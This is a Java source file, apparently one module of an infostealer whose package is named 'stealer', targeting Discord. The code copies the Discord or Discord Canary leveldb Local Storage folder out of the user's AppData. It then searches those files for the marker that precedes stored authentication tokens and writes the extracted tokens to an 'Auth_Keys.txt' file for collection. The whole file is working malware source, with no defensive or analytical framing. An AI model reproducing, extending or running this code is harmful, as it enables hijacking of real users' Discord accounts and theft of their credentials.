package dev.kazi.stealer.node.nodes.impl.app;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.LinkedList;
import java.util.List;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.io.File;
import dev.kazi.stealer.node.Category;
import java.util.regex.Pattern;
import dev.kazi.stealer.node.Node;

public class Discord extends Node {

    private static final Pattern pattern;
    
    public Discord() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        try {
            final File discord_location = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Appdata\\Roaming\\");
            if (this.mergePath(discord_location, "discord\\Local Storage\\leveldb\\").exists()) {
                try {
                    Files.copy(this.mergePath(discord_location, "discord\\Local Storage\\leveldb").toPath(), this.mergePath(new File("C:\\Users\\" + System.getProperty("user.name")), "Discord").toPath(), new CopyOption[0]);
                }
                catch (final FileAlreadyExistsException fileAlreadyExistsException) {
                    fileAlreadyExistsException.printStackTrace();
                }
            }
            else if (this.mergePath(discord_location, "discordcanary\\Local Storage\\leveldb\\").exists()) {
                try {
                    Files.copy(this.mergePath(discord_location, "discordcanary\\Local Storage\\leveldb\\").toPath(), this.mergePath(this.getFolder(), "Discord").toPath(), new CopyOption[0]);
                }
                catch (final FileAlreadyExistsException fileAlreadyExistsException) {
                    fileAlreadyExistsException.printStackTrace();
                }
            }
            if (this.mergePath(this.getFolder(), "Discord").exists()) {
                this.getToken();
            }
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public void getToken() throws IOException {
        final StringBuilder sb = new StringBuilder();
        for (final String s : getTokens()) {
            sb.append("[TOKEN] ").append(s).append("\n");
        }
        final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "Discord") + "\\Auth_Keys.txt", true);
        final BufferedWriter bufferedWriter = new BufferedWriter(writer);
        bufferedWriter.write(sb.toString());
        bufferedWriter.close();
    }
    
    public static List<String> getTokens() {
        final LinkedList<String> token = new LinkedList<String>();
        final String regex = "dQw4w9WgXcQ:";
        final File[] listFiles;
        final File[] files = listFiles = new File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\").listFiles();
        for (final File file : listFiles) {
            try (final BufferedReader br = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.contains(regex)) {
                        token.add(line.split(regex)[1].split("\"")[0]);
                    }
                }
            }
            catch (final Exception exception) {
                throw new RuntimeException(exception);
            }
        }
        return token;
    }
    
    static {
        pattern = Pattern.compile("dQw4w9WgXcQ:");
    }
}
